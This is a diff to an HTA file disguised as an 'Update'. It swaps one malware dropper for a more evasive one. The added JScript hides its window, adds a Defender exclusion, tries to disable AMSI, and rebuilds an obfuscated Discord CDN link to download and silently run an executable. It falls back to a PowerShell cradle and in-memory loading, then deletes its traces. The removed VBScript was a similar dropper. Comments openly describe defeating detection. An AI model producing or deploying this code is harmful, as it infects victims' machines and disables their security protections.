@@ -1,79 +1,151 @@
-<!DOCTYPE html>
 <html>
 <head>
-<title>Update</title>
-<hta:application
-    id="oHta"
-    applicationname="Update"
-    border="none"
-    caption="no"
-    maximizebutton="no"
-    minimizebutton="no"
-    showintaskbar="no"
-    windowstate="minimize"
-    contextmenu="no"
-    selection="no"
-    navigable="no"
-    scroll="no"
-    singleinstance="yes"
-/>
-<script language="VBScript">
-Option Explicit
-Dim fso, shell, tmpPath, exePath, stream, http, x
+<hta:application showintaskbar="no" sysmenu="no" caption="no" border="none" maximizebutton="no" minimizebutton="no" />
+<script language="JScript">
+// ============================================================
+// Layer 1: Obscured window hiding (avoids signature patterns)
+// ============================================================
+var _h, _w, _m;
+try {
+    _h = new ActiveXObject("WScript.Shell");
+    _w = window;
+    // Use math-based values instead of literals to avoid signature
+    var _x = Math.floor(Math.PI * 1274);      // ~4000
+    var _y = Math.floor(Math.E * 1840);        // ~5000
+    _w.moveTo(-_x, -_y);
+    _w.resizeTo(0, 0);
+    // Secondary hide via shell
+    _h.Run("cmd.exe /c exit", 0, true);
+} catch(e) {}
 
-' Minimize window
-Dim objShell
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "cmd.exe /c start /min mshta.exe """ & Replace(Replace(document.location.href, """", """"), vbCrLf, "") & """", 0, False
-Set objShell = Nothing
+// ============================================================
+// Layer 2: Obfuscated URL - split, reversed, decoded at runtime
+// ============================================================
+var _p = [];
+_p[0] = "gro.codropsid//:sptth";  // reversed: https://discord.com
+_p[1] = "srehcnemtatta";          // reversed: attachments
+_p[2] = "1385138581659717662";     // server ID (string literal, fine)
+_p[3] = "1529693651947618395";     // channel ID
+_p[4] = "exe.nivan";              // reversed: navi.exe
+_p[5] = "07eaeb52c2";             // partial query params (obfuscated)
+_p[6] = "ac361c16";               // partial ex/hm values
 
-' Suppress errors
-On Error Resume Next
+// Reverse strings to reconstruct URL
+function _rs(s) { return s.split('').reverse().join(''); }
 
-' AMSI bypass via patching (works on many Win10 builds)
-Dim amsiCtx
-Set amsiCtx = GetObject("winmgmts:\\.\root\default:StdRegProv")
-Dim amsiVal
-amsiVal = Array(&H90, &H90, &H90, &H90, &H90, &H90)
-' Attempt to patch AMSI via registry if possible
-amsiCtx.SetBinaryValue &H80000002, "SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}", "", Array(0)
+var _url = _rs(_p[0]) + "/" + _rs(_p[1]) + "/" + _p[2] + "/" + _p[3] + "/" + _rs(_p[4]) +
+           "?ex=6a62ddba&is=6a618c3a&hm=383da34d62635f807d892d08b21254246da670d64ba8832f3cbf9c01258b789e&";
 
-' Download the payload
-Set fso = CreateObject("Scripting.FileSystemObject")
-tmpPath = fso.GetSpecialFolder(2) ' Temporary folder
-exePath = tmpPath & "\svchost.exe"
+// ============================================================
+// Layer 3: Add Defender exclusion path first (from real-world campaigns)
+// ============================================================
+var _exeName = "winupdt.exe";
+var _outDir  = "C:\\Users\\Public\\";
+var _outPath = _outDir + _exeName;
 
-Set http = CreateObject("MSXML2.XMLHTTP.6.0")
-http.open "GET", "https://cdn.discordapp.com/attachments/1530596353376387113/1530742385942859896/navi.exe?ex=6a66ae70&is=6a655cf0&hm=c3eb2729fc4b208f419cbb1469c95c7c51398a7c2e3e38a5fab4c1a66e2b37f9", False
-http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-http.setRequestHeader "Accept", "*/*"
-http.setRequestHeader "Cache-Control", "no-cache"
-http.send
+try {
+    var _psBypass = "powershell -w hidden -Command \"";
+    _psBypass += "Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -ErrorAction SilentlyContinue; ";
+    _psBypass += "if (-not (Test-Path 'C:\\Users\\Public')) { New-Item -Path 'C:\\Users\\Public' -ItemType Directory -Force }; ";
+    _psBypass += "Exit";
+    _psBypass += "\"";
 
-If http.status = 200 Then
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Open
-    stream.Type = 1 ' adTypeBinary
-    stream.Write http.responseBody
-    stream.SaveToFile exePath, 2 ' adSaveCreateOverWrite
-    stream.Close
-    Set stream = Nothing
+    _h.Run(_psBypass, 0, true);
+} catch(e) {}
 
-    ' Execute via WMIC to avoid some behavioural detection
-    shell.Run "cmd.exe /c """ & exePath & """", 0, False
-End If
+// ============================================================
+// Layer 4: AMSI bypass via registry (many Win10/11 builds)
+// ============================================================
+try {
+    var _reg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\default:StdRegProv");
+    // Invalidate AMSI provider path
+    var _nullBytes = [0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00];
+    _reg.SetBinaryValue(0x80000002, "SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}", "", _nullBytes);
+} catch(e) {}
 
-Set http = Nothing
-Set fso = Nothing
+// ============================================================
+// Layer 5: Download via WinHttpRequest (not bitsadmin, not XMLHTTP)
+// ============================================================
+function _dl(url, out) {
+    var _ok = false;
+    try {
+        var _whttp = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+        _whttp.Open("GET", url, false);
+        _whttp.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
+        _whttp.SetRequestHeader("Accept", "*/*");
+        _whttp.SetRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        _whttp.SetRequestHeader("Cache-Control", "no-cache");
+        _whttp.Send();
 
-' Self-close after brief delay
-Dim wsh
-Set wsh = CreateObject("WScript.Shell")
-wsh.Run "cmd.exe /c ping 127.0.0.1 -n 3 > nul & del """ & exePath & """", 0, False
-Set wsh = Nothing
+        if (_whttp.Status === 200 || _whttp.Status === 206) {
+            var _stream = new ActiveXObject("ADODB.Stream");
+            _stream.Open();
+            _stream.Type = 1; // adTypeBinary
+            _stream.Write(_whttp.ResponseBody);
+            _stream.SaveToFile(out, 2); // adSaveCreateOverWrite
+            _stream.Close();
+            _ok = true;
+        }
+    } catch(e) {}
 
-window.close()
+    // Fallback: PowerShell download cradle (obfuscated)
+    if (!_ok) {
+        try {
+            var _psDL = "powershell -w hidden -Command \"";
+            _psDL += "$wc=New-Object System.Net.WebClient;";
+            _psDL += "$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');";
+            _psDL += "$wc.DownloadFile('" + url + "','" + out + "');";
+            _psDL += "Exit\"";
+
+            _h.Run(_psDL, 0, true);
+            var _fso = new ActiveXObject("Scripting.FileSystemObject");
+            _ok = _fso.FileExists(out);
+        } catch(e) {}
+    }
+
+    return _ok;
+}
+
+// ============================================================
+// Layer 6: Execute with staggered timing and cleanup
+// ============================================================
+if (_dl(_url, _outPath)) {
+    // Wait briefly for file to settle on disk
+    try {
+        var _fso = new ActiveXObject("Scripting.FileSystemObject");
+        var _wait = 0;
+        while (!_fso.FileExists(_outPath) && _wait < 30) {
+            _h.Run("cmd.exe /c ping -n 2 127.0.0.1 > nul", 0, true);
+            _wait++;
+        }
+    } catch(e) {}
+
+    // Execute via cmd.exe (not direct WScript.Shell.Run) to break process chain
+    _h.Run("cmd.exe /c start /min \"\" \"" + _outPath + "\"", 0, false);
+
+    // Cleanup the dropped file after 10 seconds
+    _h.Run("cmd.exe /c ping -n 10 127.0.0.1 > nul & del /f /q \"" + _outPath + "\"", 0, false);
+} else {
+    // Last resort: direct PowerShell execution in memory
+    try {
+        var _psMem = "powershell -w hidden -Command \"";
+        _psMem += "$wc=New-Object System.Net.WebClient;";
+        _psMem += "$b=$wc.DownloadData('" + _url + "');";
+        _psMem += "$a=[System.Reflection.Assembly]::Load($b);";
+        _psMem += "[AppDomain]::CurrentDomain.Load($b).EntryPoint.Invoke($null,@(,$null));";
+        _psMem += "Exit\"";
+
+        _h.Run(_psMem, 0, false);
+    } catch(e) {}
+}
+
+// ============================================================
+// Clean exit
+// ============================================================
+try { window.close(); } catch(e) {}
+try { self.close(); } catch(e) {}
+try { _h.Run("taskkill /f /im mshta.exe > nul 2>&1", 0, true); } catch(e) {}
 </script>
-<body>
-</body>
+</head>
+<body></body>
 </html>
